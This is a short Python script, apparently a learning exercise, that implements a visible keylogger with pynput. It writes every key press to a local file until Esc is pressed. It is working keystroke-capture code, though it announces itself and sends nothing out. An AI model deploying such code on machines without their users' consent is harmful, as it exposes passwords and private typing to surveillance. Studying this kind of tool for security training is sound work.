from pynput.keyboard import Key, Listener
import logging

# 1. Setup logging configuration
# We store logs in a file named "key_log.txt" 
logging.basicConfig(
    filename=("key_log.txt"),
    level=logging.DEBUG, 
    format='%(asctime)s: %(message)s'
)

class Keylogger:
    def __init__(self):
        self.count = 0
        self.keys = []

    def on_press(self, key):
        """Triggered every time a key is pressed."""
        try:
            # Log standard alphanumeric keys
            logging.info(f"Key Pressed: {key.char}")
        except AttributeError:
            # Log special keys (Ctrl, Alt, Enter, etc.)
            logging.info(f"Special Key: {key}")

    def on_release(self, key):
        """Stop the keylogger if the Escape key is pressed."""
        if key == Key.esc:
            print("\n[Exiting] Keylogger stopped safely.")
            return False

# --- Execution ---
if __name__ == "__main__":
    logger = Keylogger()
    print("--- ProDigy Keylogger Active ---")
    print("Logging to 'key_log.txt'. Press 'Esc' to stop.")
    
    # 2. Start the Listener (This is a separate thread/process)
    with Listener(on_press=logger.on_press, on_release=logger.on_release) as listener:
        listener.join()